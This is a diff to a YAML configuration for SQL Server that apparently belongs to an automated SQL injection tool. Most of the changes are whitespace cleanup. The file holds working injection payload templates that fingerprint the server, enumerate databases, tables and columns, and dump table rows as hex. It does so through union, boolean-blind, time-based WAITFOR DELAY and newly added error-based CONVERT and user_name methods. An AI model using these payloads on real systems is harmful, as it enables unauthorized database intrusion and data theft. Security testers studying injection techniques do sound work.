@@ -1,18 +1,18 @@
 vendor: SQL Server
 
-resource: 
+resource:
  info: |
-  SELECT 
+  SELECT
       %20@@version
       %2B'${enclose_value_sql}'
       %2BDB_NAME()
       %2B'${enclose_value_sql}'
       %2Buser
       %2B'${trail_sql}'
-      
- schema: 
+
+ schema:
   database: |
-   SELECT 
+   SELECT
        replace(
            CONVERT(
                VARCHAR(MAX),
@@ -28,9 +28,9 @@ resource:
                                AS VARBINARY(MAX)
                            )),'0x','')
                            FROM (
-                               select 
+                               select
                                    name,
-                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
                                from master..sysdatabases
                            )x
                            where 1=1
@@ -43,14 +43,14 @@ resource:
                    ),
                    2
                )
-           ) 
+           )
            %2B '${trail_sql}',
            ',',
            '${separator_cell_sql}'
        )
-       
+
   table: |
-   SELECT 
+   SELECT
        replace(
            CONVERT(
                VARCHAR(MAX),
@@ -66,10 +66,10 @@ resource:
                                AS VARBINARY(MAX)
                            )),'0x','')
                            FROM (
-                               select 
-                                   name, 
-                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
-                               from ${database}..sysobjects 
+                               select
+                                   name,
+                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
+                               from ${database}..sysobjects
                                WHERE xtype='U'
                            )x
                            where 1=1
@@ -82,14 +82,14 @@ resource:
                    ),
                    2
                )
-           ) 
+           )
            %2B '${trail_sql}',
            ',',
            '${separator_cell_sql}'
        )
-       
+
   column: |
-   SELECT 
+   SELECT
        replace(
            CONVERT(
                VARCHAR(MAX),
@@ -105,9 +105,9 @@ resource:
                                AS VARBINARY(MAX)
                            )),'0x','')
                            FROM (
-                               select 
-                                   c.name, 
-                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+                               select
+                                   c.name,
+                                   ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
                                FROM
                                    ${database}..syscolumns c,
                                    ${database}..sysobjects t
@@ -129,10 +129,10 @@ resource:
            ',',
            '${separator_cell_sql}'
        )
-       
-  row: 
+
+  row:
    query: |
-    SELECT 
+    SELECT
         replace(
             CONVERT(
                 VARCHAR(MAX),
@@ -140,7 +140,7 @@ resource:
                     VARBINARY(MAX),
                     '0'%2bSTUFF(
                         (
-                            SELECT 
+                            SELECT
                                 replace(sys.fn_varbintohexstr(CAST(
                                     ','
                                     %2b'${enclose_value_sql}'
@@ -149,9 +149,9 @@ resource:
                                     AS VARBINARY(MAX)
                                 )),'0x','')
                             FROM (
-                                select 
-                                    *, 
-                                    ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
+                                select
+                                    *,
+                                    ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum
                                 FROM ${database}.dbo.${table}
                             )x
                             where 1=1
@@ -169,27 +169,27 @@ resource:
             ',',
             '${separator_cell_sql}'
         )
-   fields: 
+   fields:
     field: |
      LTRIM(
          RTRIM(
              coalesce(
-                 ${field.value}, 
+                 ${field.value},
                  ''
              )
          )
      )
     concat: "%2b '%7f' %2b"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    (
-       select 
+       select
            '${lead}'
            %2Bsubstring(
-               (${injection}), 
-               ${window.char}, 
+               (${injection}),
+               ${window.char},
                65536
            )
    )
@@ -198,26 +198,26 @@ strategy:
   calibrator: replicate(${calibrator_hex}, 1024)
   limitBoundary: 1
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - "[Microsoft][SQL Server"
     - SQL Server
-    
- normal: 
+
+ normal:
   indices: union select ${indices}
   capacity: (select concat('${lead}${indice}', ${calibrator}))
   orderBy: order by 1337
-  
- boolean: 
-  test: 
-   falses: 
+
+ boolean:
+  test:
+   falses:
     - 1 = 0
     - "'a' %21= 'a'"
     - "'b' %21= 'b'"
     - 1 = 2
     - 1 %21= 1
     - 2 %21= 2
-   trues: 
+   trues:
     - 1 = 1
     - 0 = 0
     - "'a' %21= 'b'"
@@ -229,11 +229,11 @@ strategy:
     0 != (
         ascii(
             substring(
-                ${injection}, 
-                ${window.char}, 
+                ${injection},
+                ${window.char},
                 1
             )
-        ) 
+        )
         %26 ${bit}
     )
    length: len(${injection}) > ${window.char}
@@ -242,7 +242,82 @@ strategy:
   blind: ${boolean.mode} ${test}
   # TODO no boolean mode here on Time for sqlserver
   time: |
-   ; if (${test}) 
-       WAITFOR DELAY '00:00:00' 
-   else 
+   ; if (${test})
+       WAITFOR DELAY '00:00:00'
+   else
        WAITFOR DELAY '00:00:${sleep_time}'
+  
+ error:
+  method:
+  
+   - name: CONVERT::EXPL:Stack
+     query: |
+      ;select CONVERT(INT,(
+          ${window}
+      ))
+     # TODO Add to SQLEngine
+     capacity: 1991 
+  
+   - name: CONVERT::EXPL:OR
+     query: |
+      OR 1=CONVERT(INT,(
+          ${window}
+      ))
+     # TODO Add to SQLEngine
+     capacity: 1991 
+           
+   - name: CONVERT::EXPL:OR
+     query: |
+      AND 1=CONVERT(INT,(
+          ${window}
+      ))
+     # TODO Add to SQLEngine
+     capacity: 1991       
+  
+   - name: CONVERT::IMPL:Stack
+     query: |
+      ;select 1/(
+          ${window}
+      )
+     # TODO Add to SQLEngine
+     capacity: 1991 
+  
+   - name: CONVERT::IMPL:OR
+     query: |
+      OR 1=1/(
+          ${window}
+      )
+     # TODO Add to SQLEngine
+     capacity: 1991 
+           
+   - name: CONVERT::IMPL:OR
+     query: |
+      AND 1=1/(
+          ${window}
+      )
+     # TODO Add to SQLEngine
+     capacity: 1991       
+  
+   - name: USER_NAME:OR
+     query: |
+      ;select user_name((
+          ${window}
+      ))
+     # TODO Add to SQLEngine
+     capacity: 1991 
+  
+   - name: USER_NAME:OR
+     query: |
+      OR 1=user_name((
+          ${window}
+      ))
+     # TODO Add to SQLEngine
+     capacity: 1991 
+           
+   - name: USER_NAME:OR
+     query: |
+      AND 1=user_name((
+          ${window}
+      ))
+     # TODO Add to SQLEngine
+     capacity: 1991       
